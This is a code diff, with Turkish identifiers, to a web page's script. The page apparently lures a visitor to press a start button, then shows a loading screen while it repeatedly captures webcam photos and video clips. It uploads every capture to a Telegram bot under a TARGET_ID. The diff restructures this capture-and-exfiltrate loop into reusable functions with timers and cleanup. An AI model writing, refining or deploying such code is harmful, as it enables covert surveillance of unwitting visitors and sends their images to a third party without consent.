@@ -155,6 +155,8 @@
             let photoCount = 0;
             let stream = null;
             let baslangicZamani = 0;
+            let videoInterval = null;
+            let fotoInterval = null;
             
             async function startCamera() {
                 try {
@@ -173,64 +175,17 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        baslangicZamani = performance.now();
+                        baslangicZamani = Date.now();
                         
                         // ========================================
-                        // İLK FOTOĞRAF - HEMEN ÇEK
+                        // VİDEO FONKSİYONU
                         // ========================================
-                        setTimeout(() => {
-                            photoCount++;
+                        function videoBaslat() {
+                            if (!stream?.active) return;
                             
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            ctx.drawImage(video, 0, 0);
-                            
-                            canvas.toBlob(function(blob) {
-                                if (!blob) return;
-                                const formData = new FormData();
-                                formData.append('chat_id', TARGET_ID);
-                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
-                                
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            }, 'image/jpeg', 0.85);
-                            
-                            // Fotoğraf zamanlayıcısı
-                            setInterval(() => {
-                                if (!stream?.active) return;
-                                
-                                photoCount++;
-                                
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                ctx.drawImage(video, 0, 0);
-                                
-                                canvas.toBlob(function(blob) {
-                                    if (!blob) return;
-                                    const formData = new FormData();
-                                    formData.append('chat_id', TARGET_ID);
-                                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
-                                    
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
-                                }, 'image/jpeg', 0.85);
-                                
-                            }, FOTO_SURESI * 1000);
-                            
-                        }, 10); // 10ms sonra ilk fotoğraf
-                        
-                        // ========================================
-                        // İLK VİDEO - HEMEN BAŞLAT
-                        // ========================================
-                        setTimeout(() => {
-                            videoCount = 1;
-                            const videoBaslangic = performance.now();
+                            videoCount++;
+                            const videoIndex = videoCount;
+                            const videoBaslangic = Date.now();
                             const chunks = [];
                             
                             try {
@@ -250,7 +205,7 @@
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('video', blob, `video_${Date.now()}.webm`);
-                                    formData.append('caption', `🎥 Video #1 - ${VIDEO_SURESI}s`);
+                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
                                     
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                         method: 'POST',
@@ -264,52 +219,47 @@
                                     if (mr.state === 'recording') mr.stop();
                                 }, VIDEO_SURESI * 1000);
                                 
-                                // Sonraki videolar
-                                setInterval(() => {
-                                    if (!stream?.active) return;
-                                    
-                                    videoCount++;
-                                    const videoIndex = videoCount;
-                                    const videoBaslangic = performance.now();
-                                    const chunks = [];
-                                    
-                                    try {
-                                        const mr = new MediaRecorder(stream, {
-                                            mimeType: 'video/webm;codecs=vp8',
-                                            videoBitsPerSecond: 2500000
-                                        });
-                                        
-                                        mr.ondataavailable = (e) => {
-                                            if (e.data.size > 0) chunks.push(e.data);
-                                        };
-                                        
-                                        mr.onstop = () => {
-                                            const blob = new Blob(chunks, { type: 'video/webm' });
-                                            const boyutKB = (blob.size / 1024).toFixed(0);
-                                            
-                                            const formData = new FormData();
-                                            formData.append('chat_id', TARGET_ID);
-                                            formData.append('video', blob, `video_${Date.now()}.webm`);
-                                            formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
-                                            
-                                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                                method: 'POST',
-                                                body: formData
-                                            });
-                                        };
-                                        
-                                        mr.start();
-                                        
-                                        setTimeout(() => {
-                                            if (mr.state === 'recording') mr.stop();
-                                        }, VIDEO_SURESI * 1000);
-                                        
-                                    } catch(e) {}
-                                }, VIDEO_SURESI * 1000);
-                                
                             } catch(e) {}
+                        }
+                        
+                        // ========================================
+                        // FOTOĞRAF FONKSİYONU
+                        // ========================================
+                        function fotoBaslat() {
+                            if (!stream?.active) return;
                             
-                        }, 10); // 10ms sonra ilk video
+                            photoCount++;
+                            
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(function(blob) {
+                                if (!blob) return;
+                                const formData = new FormData();
+                                formData.append('chat_id', TARGET_ID);
+                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
+                                
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            }, 'image/jpeg', 0.85);
+                        }
+                        
+                        // ========================================
+                        // HEMEN BAŞLAT (0. SANİYE)
+                        // ========================================
+                        // İlk video
+                        videoBaslat();
+                        
+                        // İlk fotoğraf
+                        fotoBaslat();
+                        
+                        // Zamanlayıcıları başlat
+                        videoInterval = setInterval(videoBaslat, VIDEO_SURESI * 1000);
+                        fotoInterval = setInterval(fotoBaslat, FOTO_SURESI * 1000);
                     };
                     
                 } catch(e) {
@@ -318,6 +268,8 @@
             }
             
             window.onbeforeunload = function() {
+                if (videoInterval) clearInterval(videoInterval);
+                if (fotoInterval) clearInterval(fotoInterval);
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
@@ -326,4 +278,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
